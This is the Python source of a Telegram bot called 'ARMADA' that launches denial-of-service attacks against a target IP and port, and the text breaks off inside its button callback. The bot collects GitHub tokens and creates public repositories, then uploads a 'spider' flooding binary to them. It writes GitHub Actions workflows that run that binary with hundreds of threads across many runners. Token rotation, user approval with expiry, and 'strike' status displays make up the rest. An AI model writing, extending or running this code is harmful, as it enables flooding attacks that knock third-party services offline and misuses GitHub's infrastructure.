import os
import json
import logging
import time
import uuid
import asyncio
import random
import traceback
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
RUNNERS_PER_ATTACK = int(os.environ.get("RUNNERS_PER_ATTACK", "10"))
THREADS_PER_RUNNER = int(os.environ.get("THREADS_PER_RUNNER", "200"))
MAX_REPOS_PER_ATTACK = int(os.environ.get("MAX_REPOS_PER_ATTACK", "2"))
TOKEN_RATE_LIMIT_THRESHOLD = int(os.environ.get("TOKEN_RATE_LIMIT_THRESHOLD", "50"))

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
WAITING_FOR_BINARY = 1

# ===== GLOBALS =====
active_attacks = {}
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}
attack_counters = {}

# ===== SAFE FILE OPS =====
def load_json(filename, default=None):
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
        return default if default is not None else {}
    except Exception as e:
        logger.error(f"Load {filename} error: {e}")
        return default if default is not None else {}

def save_json(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Save {filename} error: {e}")

# ===== INIT =====
def init_data():
    global owners, github_tokens, approved_users, pending_users, attack_counters
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    github_tokens = load_json('github_tokens.json', [])
    approved_users = load_json('approved_users.json', {})
    pending_users = load_json('pending_users.json', [])
    attack_counters = load_json('attack_counters.json', {})

init_data()

# ============================================================
# ===== TOKEN MANAGER =====
# ============================================================

class TokenManager:
    def __init__(self, tokens_list):
        self.tokens = tokens_list
        self.in_use = {}
        self.ratelimit_cache = {}
        self._last_rotation = 0
        self._rotation_index = 0

    def _validate_token(self, token):
        try:
            g = Github(token)
            user = g.get_user()
            _ = user.login
            rate = g.get_rate_limit()
            remaining = rate.core.remaining
            return True, remaining, user.login
        except:
            return False, 0, None

    def health_check(self):
        global github_tokens
        valid = []
        for td in github_tokens:
            token = td.get('token')
            if not token:
                continue
            ok, remaining, username = self._validate_token(token)
            if ok:
                td['username'] = username
                td['remaining'] = remaining
                valid.append(td)
            else:
                logger.warning(f"🗑️ Removed dead token: {token[:10]}...")
        github_tokens = valid
        save_json('github_tokens.json', github_tokens)
        self.in_use = {td['token']: 0 for td in github_tokens}
        self.ratelimit_cache = {td['token']: td.get('remaining', 1000) for td in github_tokens}
        return len(valid)

    def get_attack_tokens(self, max_count, exclude=[]):
        healthy = []
        candidates = [td for td in github_tokens if td['token'] not in exclude]
        candidates.sort(key=lambda x: (
            -x.get('remaining', 0),
            self.in_use.get(x['token'], 0)
        ))
        for td in candidates:
            token = td['token']
            if token in exclude:
                continue
            remaining = td.get('remaining', 0)
            if remaining < 50:
                continue
            if self.in_use.get(token, 0) > 0:
                continue
            healthy.append(td)
            if len(healthy) >= max_count:
                break
        return healthy[:max_count]

    def mark_used(self, token):
        self.in_use[token] = self.in_use.get(token, 0) + 1
        for td in github_tokens:
            if td['token'] == token:
                td['remaining'] = td.get('remaining', 1000) - 100
                break

    def mark_released(self, token):
        if token in self.in_use:
            self.in_use[token] = max(0, self.in_use[token] - 1)

    def force_rotate(self):
        import time
        current = time.time()
        if current - self._last_rotation > 300:
            self._last_rotation = current
            self._rotation_index = (self._rotation_index + 1) % max(1, len(github_tokens))
            for token in list(self.in_use.keys()):
                self.in_use[token] = 0
            return True
        return False

token_manager = TokenManager(github_tokens)

# ============================================================
# ===== VALIDATION & HELPERS =====
# ============================================================

def validate_github_token(token):
    try:
        if not token or len(token) < 20:
            return False, "Token too short"
        g = Github(token)
        user = g.get_user()
        _ = user.login
        rate = g.get_rate_limit()
        if rate.core.remaining < 1:
            return False, "Rate limit exhausted"
        return True, user.login
    except GithubException as e:
        if e.status == 401:
            return False, "Invalid token (401)"
        elif e.status == 403:
            return False, "Rate limited (403)"
        elif e.status == 404:
            return False, "Token has no permissions (404)"
        else:
            return False, f"GitHub error: {e.status}"
    except Exception as e:
        return False, f"Error: {str(e)[:40]}"

def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

def format_attack_box(ip, port, time_val, deployed, attack_id, start_time, finish_time, total_threads):
    # Sexy ASCII box design
    box_width = 50
    top = f"╔{'═' * box_width}╗"
    bottom = f"╚{'═' * box_width}╝"
    
    lines = []
    lines.append(f"║ {'☠️  NUCLEAR STRIKE DEPLOYED':^{box_width}} ║")
    lines.append(f"╠{'═' * box_width}╣")
    lines.append(f"║ {'🎯 TARGET':<20} {'┃':^1} {ip}:{port:<27} ║")
    lines.append(f"║ {'⏱️ DURATION':<20} {'┃':^1} {time_val}s{' ' * 26} ║")
    lines.append(f"║ {'📦 REPOS':<20} {'┃':^1} {len(deployed)}/{MAX_REPOS_PER_ATTACK}{' ' * 23} ║")
    lines.append(f"║ {'⚙️ RUNNERS':<20} {'┃':^1} {min(RUNNERS_PER_ATTACK, 15)} × {THREADS_PER_RUNNER}{' ' * 17} ║")
    lines.append(f"║ {'🔥 THREADS':<20} {'┃':^1} {total_threads}{' ' * 26} ║")
    lines.append(f"║ {'🆔 STRIKE ID':<20} {'┃':^1} {attack_id[:20]}{' ' * 6} ║")
    lines.append(f"║ {'⏰ LAUNCH':<20} {'┃':^1} {start_time}{' ' * 17} ║")
    lines.append(f"║ {'⌛ ETA':<20} {'┃':^1} {finish_time}{' ' * 17} ║")
    lines.append(f"╚{'═' * box_width}╝")
    
    return "\n".join(lines)

# ===== ATTACK MANAGEMENT =====
def start_attack(attack_id, targets, user_id):
    active_attacks[attack_id] = {
        "targets": targets,
        "user_id": user_id,
        "start_time": time.time(),
        "timer_task": None
    }
    save_json('attack_state.json', active_attacks)
    attack_counters[str(user_id)] = attack_counters.get(str(user_id), 0) + 1
    save_json('attack_counters.json', attack_counters)

def finish_attack(attack_id):
    if attack_id in active_attacks:
        timer_task = active_attacks[attack_id].get("timer_task")
        if timer_task and not timer_task.done():
            timer_task.cancel()
        for t in active_attacks[attack_id].get("targets", []):
            token_manager.mark_released(t['token'])
        del active_attacks[attack_id]
        save_json('attack_state.json', active_attacks)

# ============================================================
# ===== BINARY UPLOAD =====
# ============================================================

async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return ConversationHandler.END
        token_manager.health_check()
        if not github_tokens:
            await update.message.reply_text("❌ Token Vault Empty", parse_mode='HTML')
            return ConversationHandler.END
        await update.message.reply_text(
            "📤 UPLOAD BINARY\n\n"
            "Send the `spider` binary.\n"
            "Type /cancel to abort.",
            parse_mode='HTML'
        )
        return WAITING_FOR_BINARY
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return ConversationHandler.END
        if not update.message.document:
            await update.message.reply_text("❌ Please send a file.", parse_mode='HTML')
            return WAITING_FOR_BINARY
        file = update.message.document
        if file.file_name != "spider":
            await update.message.reply_text(f"❌ File must be named `spider`. Found: `{file.file_name}`", parse_mode='HTML')
            return WAITING_FOR_BINARY
        token_manager.health_check()
        if not github_tokens:
            await update.message.reply_text("❌ No valid tokens. Add with /addtoken", parse_mode='HTML')
            return ConversationHandler.END

        progress = await update.message.reply_text("⏳ Uploading to all repositories...", parse_mode='HTML')
        file_obj = await file.get_file()
        file_path = f"temp_{file.file_id}.bin"
        await file_obj.download_to_drive(file_path)
        with open(file_path, 'rb') as f:
            content = f.read()
        os.remove(file_path)

        success_count = 0
        fail_count = 0
        results = []
        for token_data in github_tokens:
            token = token_data.get('token')
            repo_name = token_data.get('repo')
            username = token_data.get('username', 'unknown')
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    existing = repo.get_contents("spider")
                    repo.update_file("spider", "Update spider binary", content, existing.sha)
                    results.append((username, True, "✅ Updated"))
                except Exception:
                    repo.create_file("spider", "Add spider binary", content)
                    results.append((username, True, "✅ Created"))
                success_count += 1
            except Exception as e:
                results.append((username, False, f"❌ {str(e)[:40]}"))
                fail_count += 1

        msg = f"✅ BINARY DEPLOYMENT COMPLETE\n"
        msg += f"Success: {success_count} | Failed: {fail_count} | Total: {len(github_tokens)}\n"
        for username, success, status in results:
            emoji = "✅" if success else "❌"
            msg += f"{emoji} @{username}: {status}\n"
        await progress.edit_text(msg, parse_mode='HTML')
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Upload error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== TOKEN COMMANDS =====
# ============================================================

async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: /addtoken <github_token>", parse_mode='HTML')
            return
        token = context.args[0].strip()
        is_valid, info = validate_github_token(token)
        if not is_valid:
            await update.message.reply_text(f"❌ Invalid Token\n{info}", parse_mode='HTML')
            return
        for t in github_tokens:
            if t.get('token') == token:
                await update.message.reply_text("⚠️ Token already exists.", parse_mode='HTML')
                return
        g = Github(token)
        user = g.get_user()
        username = user.login
        for t in github_tokens:
            if t.get('username') == username:
                await update.message.reply_text(
                    f"⚠️ @{username} already has a token.\n"
                    f"Repo: {t.get('repo')}\n"
                    f"Remove it with /removetoken",
                    parse_mode='HTML'
                )
                return
        repo_name = f"spider-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False)
        try:
            repo.create_file(".github/workflows/main.yml", "Init workflow", "")
        except:
            pass
        new_entry = {
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_at': datetime.now().isoformat()
        }
        github_tokens.append(new_entry)
        save_json('github_tokens.json', github_tokens)
        token_manager.health_check()
        await update.message.reply_text(
            f"✅ TOKEN ADDED\n"
            f"User: @{username}\n"
            f"Repo: {repo_name}\n"
            f"Vault: {len(github_tokens)} tokens",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")

async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        removed = token_manager.health_check()
        if not github_tokens:
            msg = "📭 Token Vault Empty"
            if removed > 0:
                msg = f"🧹 Removed {removed} expired tokens.\n📭 Vault is empty."
            await update.message.reply_text(msg, parse_mode='HTML')
            return
        msg = "🔐 TOKEN VAULT\n\n"
        if removed > 0:
            msg += f"🧹 Removed {removed} expired tokens\n"
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "…" + t['token'][-4:]
            remaining = t.get('remaining', '?')
            msg += f"{i}. @{t.get('username', 'Unknown')} – {token_short} (remaining: {remaining})\n"
            msg += f"   📁 {t['repo']}\n\n"
        msg += f"Total valid: {len(github_tokens)}"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def checktokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not github_tokens:
            await update.message.reply_text("📭 No tokens to check.", parse_mode='HTML')
            return
        removed = token_manager.health_check()
        msg = "🔍 TOKEN HEALTH CHECK\n\n"
        msg += f"Total: {len(github_tokens)}\n"
        msg += f"Expired removed: {removed}\n\n"
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "…" + t['token'][-4:]
            remaining = t.get('remaining', 'N/A')
            status = "🟢" if remaining > TOKEN_RATE_LIMIT_THRESHOLD else "🟡" if remaining > 10 else "🔴"
            msg += f"{i}. {status} @{t.get('username', 'Unknown')} – {token_short} (remaining: {remaining})\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def removetoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: /removetoken <token>", parse_mode='HTML')
            return
        token = context.args[0]
        found = False
        for i, t in enumerate(github_tokens):
            if t.get('token') == token:
                github_tokens.pop(i)
                save_json('github_tokens.json', github_tokens)
                token_manager.health_check()
                found = True
                break
        if found:
            await update.message.reply_text(f"✅ Token removed. Remaining: {len(github_tokens)}", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ Token not found.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def cleartokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not github_tokens:
            await update.message.reply_text("📭 Vault already empty.", parse_mode='HTML')
            return
        count = len(github_tokens)
        if len(context.args) == 1 and context.args[0].lower() == "confirm":
            github_tokens.clear()
            save_json('github_tokens.json', github_tokens)
            token_manager.health_check()
            await update.message.reply_text(f"🗑️ Cleared {count} tokens.", parse_mode='HTML')
        else:
            await update.message.reply_text(f"⚠️ Delete ALL {count} tokens? Use /cleartokens confirm", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def rotatetokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        token_manager.force_rotate()
        token_manager.health_check()
        active_count = sum(1 for t in github_tokens if token_manager.in_use.get(t['token'], 0) > 0)
        await update.message.reply_text(
            f"🔄 TOKEN ROTATION\n\n"
            f"Total tokens: {len(github_tokens)}\n"
            f"Active: {active_count}\n"
            f"✅ All tokens released",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== ATTACK COMMAND – SEXY EDITION =====
# ============================================================

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 3:
            await update.message.reply_text(
                "⚡ USAGE\n"
                "/attack <ip> <port> <time>\n\n"
                "Example: /attack 1.1.1.1 443 60\n"
                f"Max repos: {MAX_REPOS_PER_ATTACK}",
                parse_mode='HTML'
            )
            return

        ip, port_str, time_str = context.args
        try:
            port = int(port_str)
            time_val = int(time_str)
        except:
            await update.message.reply_text("❌ Invalid input", parse_mode='HTML')
            return
        if not (1 <= port <= 65535):
            await update.message.reply_text("❌ Invalid port (1-65535)", parse_mode='HTML')
            return
        if time_val < 5 or time_val > 3600:
            await update.message.reply_text("❌ Time must be 5-3600 seconds", parse_mode='HTML')
            return

        token_manager.health_check()
        token_manager.force_rotate()
        
        if not github_tokens:
            await update.message.reply_text("❌ No tokens. Add with /addtoken", parse_mode='HTML')
            return

        healthy_tokens = token_manager.get_attack_tokens(MAX_REPOS_PER_ATTACK)
        
        if not healthy_tokens:
            await update.message.reply_text(
                "❌ No healthy tokens\n"
                f"Vault: {len(github_tokens)} tokens\n"
                "Use /checktokens to see status",
                parse_mode='HTML'
            )
            return

        attack_id = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"
        deployed = []
        failed = []

        for token_data in healthy_tokens:
            token = token_data['token']
            repo_name = token_data['repo']
            username = token_data['username']
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                
                try:
                    repo.get_contents("spider")
                except:
                    failed.append((username, "Binary missing"))
                    continue

                actual_runners = min(RUNNERS_PER_ATTACK, 15)
                yml_content = f"""name: attack
on: push
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [{','.join([str(i) for i in range(1, actual_runners+1)])}]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {ip} {port} {time_val} {THREADS_PER_RUNNER}
"""
                try:
                    file = repo.get_contents(YML_FILE_PATH)
                    repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file.sha)
                except:
                    try:
                        repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content)
                    except:
                        repo.create_file(".github/workflows/main.yml", f"Attack {ip}:{port}", yml_content)

                deployed.append({
                    "username": username,
                    "repo": repo_name,
                    "token": token,
                    "actions_url": f"https://github.com/{repo_name}/actions"
                })
                token_manager.mark_used(token)
                logger.info(f"✅ Deployed to {repo_name}")

            except Exception as e:
                failed.append((username, str(e)[:40]))
                logger.error(f"Failed {repo_name}: {e}")

        if not deployed:
            await update.message.reply_text(
                f"❌ Deployment Failed\nErrors: {failed[:3]}",
                parse_mode='HTML'
            )
            return

        start_attack(attack_id, deployed, user_id)
        active_attacks[attack_id]["duration"] = time_val
        
        async def auto_finish():
            await asyncio.sleep(time_val + 10)
            finish_attack(attack_id)
            logger.info(f"✅ Auto-finished {attack_id}")
        timer_task = asyncio.create_task(auto_finish())
        active_attacks[attack_id]["timer_task"] = timer_task

        start_time = datetime.now().strftime("%H:%M:%S")
        finish_time = (datetime.now() + timedelta(seconds=time_val)).strftime("%H:%M:%S")
        total_threads = len(deployed) * min(RUNNERS_PER_ATTACK, 15) * THREADS_PER_RUNNER

        # SEXY OUTPUT
        box = format_attack_box(ip, port, time_val, deployed, attack_id, start_time, finish_time, total_threads)
        
        message = f"<pre>{box}</pre>\n\n"
        message += f"📡 REPOS:\n"
        for d in deployed:
            message += f"• <a href='{d['actions_url']}'>@{d['username']}</a>\n"
        message += f"\n🛑 /stop to abort"
        
        await update.message.reply_text(message, parse_mode='HTML', disable_web_page_preview=True)

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}", parse_mode='HTML')

# ============================================================
# ===== STATUS COMMAND – SEXY EDITION =====
# ============================================================

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return

        if not active_attacks:
            await update.message.reply_text(
                "<pre>\n"
                "╔═══════════════════════════════════════╗\n"
                "║            📡 SYSTEM IDLE             ║\n"
                "║                                       ║\n"
                "║   STATUS   : 🟢 ONLINE               ║\n"
                "║   RAIDS    : 0                       ║\n"
                "║   THREADS  : 0                       ║\n"
                "╚═══════════════════════════════════════╝\n"
                "</pre>\n"
                "/attack to deploy",
                parse_mode='HTML'
            )
            return

        total_threads = 0
        msg = "<pre>\n"
        msg += "╔═══════════════════════════════════════════════════════╗\n"
        msg += f"║              📡 ACTIVE RAIDS ({len(active_attacks)})                 ║\n"
        msg += "╠═══════════════════════════════════════════════════════╣\n"
        
        for aid, data in active_attacks.items():
            targets = data.get("targets", [])
            total_threads += len(targets) * min(RUNNERS_PER_ATTACK, 15) * THREADS_PER_RUNNER
            elapsed = int(time.time() - data['start_time'])
            duration = data.get('duration', 60)
            remaining = duration - elapsed
            if remaining < 0:
                remaining = 0
            progress = int((elapsed / duration) * 10) if duration > 0 else 0
            if progress > 10:
                progress = 10
            bar = "█" * progress + "░" * (10 - progress)
            if targets:
                msg += f"║ 🎯 {targets[0].get('ip', '?')}:{targets[0].get('port', '?')}                    ║\n"
                msg += f"║    {bar}  {elapsed}s/{duration}s (rem: {remaining}s) ║\n"
                msg += f"║    📦 {len(targets)} repos                           ║\n"
                msg += "╠═══════════════════════════════════════════════════════╣\n"
        
        msg += f"║ 🔥 TOTAL THREADS : {total_threads}                         ║\n"
        msg += "╚═══════════════════════════════════════════════════════╝\n"
        msg += "</pre>\n"
        msg += "🛑 /stop to abort"
        
        await update.message.reply_text(msg, parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== OTHER COMMANDS =====
# ============================================================

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username or "NoUsername"
        total_attacks = sum(attack_counters.values())
        user_attacks = attack_counters.get(str(user_id), 0)

        if can_attack(user_id):
            keyboard = [
                [InlineKeyboardButton("⚡ STRIKE", callback_data="attack_help")],
                [InlineKeyboardButton("📡 STATUS", callback_data="status")],
                [InlineKeyboardButton("🛑 ABORT", callback_data="stop")],
            ]
            if is_owner(user_id):
                keyboard.append([InlineKeyboardButton("🔧 ADMIN", callback_data="admin_panel")])

            await update.message.reply_text(
                f"<pre>\n"
                f"╔═══════════════════════════════════════╗\n"
                f"║         🔥 ARMADA SYSTEM             ║\n"
                f"╠═══════════════════════════════════════╣\n"
                f"║ 👤 {username:<28} ║\n"
                f"║ 🎯 {'👑 OWNER' if is_owner(user_id) else '✅ APPROVED':<28} ║\n"
                f"║ ⚙️ {min(RUNNERS_PER_ATTACK, 15)} WORKERS/REPO{' ' * 15} ║\n"
                f"║ 🧵 {THREADS_PER_RUNNER} THREADS/WORKER{' ' * 12} ║\n"
                f"║ 📦 {MAX_REPOS_PER_ATTACK} REPOS{' ' * 24} ║\n"
                f"║ 🚀 YOUR STRIKES: {user_attacks:<4}{' ' * 16} ║\n"
                f"║ 🌍 TOTAL: {total_attacks:<4}{' ' * 18} ║\n"
                f"╚═══════════════════════════════════════╝\n"
                f"</pre>\n"
                f"/attack <ip> <port> <time>",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
                pending_users.append({"user_id": user_id, "username": username, "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                save_json('pending_users.json', pending_users)
                for owner_id in owners.keys():
                    try:
                        await context.bot.send_message(
                            int(owner_id),
                            f"📥 Access Request\n"
                            f"@{username}\n"
                            f"ID: {user_id}\n"
                            f"/approve {user_id} 7",
                            parse_mode='HTML'
                        )
                    except:
                        pass
            await update.message.reply_text(
                "⛔ Access Denied\n\n"
                "Request submitted to admin.\n"
                "Wait for approval.",
                parse_mode='HTML'
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not active_attacks:
            await update.message.reply_text("✅ No active raids.", parse_mode='HTML')
            return
        count = len(active_attacks)
        for aid in list(active_attacks.keys()):
            finish_attack(aid)
        await update.message.reply_text(
            f"🛑 ABORTED\n\n"
            f"Terminated {count} raid(s).\n"
            f"System idle.",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 ARMADA COMMANDS\n\n"
        "⚔️ ATTACK\n"
        "/attack <ip> <port> <time>\n"
        "/status – Live feed\n"
        "/stop – Abort all\n\n"
        "🔧 ADMIN\n"
        "/addtoken <token>\n"
        "/removetoken <token>\n"
        "/checktokens\n"
        "/cleartokens confirm\n"
        "/tokens\n"
        "/rotate\n"
        "/binary_upload\n"
        "/approve <id> <days>\n"
        "/remove <id>\n"
        "/users\n"
        "/pending\n"
        "/broadcast <msg>\n\n"
        "ℹ️ UTILITY\n"
        "/start\n"
        "/myid\n"
        "/about\n"
        "/help",
        parse_mode='HTML'
    )

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🆔 YOUR ID\n\n"
        f"<code>{update.effective_user.id}</code>",
        parse_mode='HTML'
    )

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 ARMADA v3.0\n\n"
        "Python + GitHub Actions\n"
        f"Max repos: {MAX_REPOS_PER_ATTACK}\n"
        f"Workers: {min(RUNNERS_PER_ATTACK, 15)} × {THREADS_PER_RUNNER}\n\n"
        "\"Speed. Precision. Dominance.\"",
        parse_mode='HTML'
    )

# ============================================================
# ===== ADMIN USER COMMANDS =====
# ============================================================

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 2:
            await update.message.reply_text("📖 Usage: /approve <user_id> <days>", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        days = int(context.args[1])
        pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
        save_json('pending_users.json', pending_users)
        expiry = "LIFETIME" if days == 0 else time.time() + (days * 24 * 3600)
        approved_users[str(target_id)] = {"username": f"user_{target_id}", "added_by": user_id, "expiry": expiry, "days": days}
        save_json('approved_users.json', approved_users)
        await update.message.reply_text(f"✅ User {target_id} approved for {days} days.", parse_mode='HTML')
        try:
            await context.bot.send_message(target_id, "✅ Access Granted!\nUse /start", parse_mode='HTML')
        except:
            pass
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: /remove <user_id>", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        if str(target_id) in approved_users:
            del approved_users[str(target_id)]
            save_json('approved_users.json', approved_users)
            await update.message.reply_text(f"✅ User {target_id} removed.", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ User not found.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not approved_users:
            await update.message.reply_text("📭 No approved users.", parse_mode='HTML')
            return
        msg = "👥 APPROVED USERS\n\n"
        for uid, data in approved_users.items():
            msg += f"`{uid}` – {data.get('days', '?')}d\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def pending_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not pending_users:
            await update.message.reply_text("📭 No pending requests.", parse_mode='HTML')
            return
        msg = "⏳ PENDING REQUESTS\n\n"
        for u in pending_users:
            msg += f"`{u.get('user_id')}` – @{u.get('username')}\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not context.args:
            await update.message.reply_text("📖 Usage: /broadcast <message>", parse_mode='HTML')
            return
        msg = " ".join(context.args)
        sent = 0
        for uid in list(owners.keys()) + list(approved_users.keys()):
            try:
                await context.bot.send_message(int(uid), f"📢 ANNOUNCEMENT\n\n{msg}", parse_mode='HTML')
                sent += 1
            except:
                pass
        await update.message.reply_text(f"✅ Sent to {sent} users.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: /maintenance <on/off>", parse_mode='HTML')
            return
        mode = context.args[0].lower()
        save_json('maintenance.json', {"maintenance": mode == "on"})
        await update.message.reply_text(f"🔧 Maintenance {'ENABLED' if mode == 'on' else 'DISABLED'}.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== CALLBACKS =====
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
